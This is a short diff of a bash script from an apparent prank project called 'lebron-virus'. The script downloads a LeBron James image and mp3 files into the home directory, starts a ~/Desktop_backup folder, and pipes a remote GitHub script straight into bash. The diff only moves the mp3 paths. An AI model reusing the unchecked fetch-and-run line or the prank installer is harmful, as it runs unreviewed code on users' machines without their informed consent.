@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 curl "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png" > ~/lebron.png
-curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/fire.mp3" > ~/fire.mp3
-curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebron.mp3" > ~/lebron.mp3
+curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/resources/fire.mp3" > ~/fire.mp3
+curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/resources/lebron.mp3" > ~/lebron.mp3
 curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebronapp.sh" | bash
 
 mkdir ~/Desktop_backup
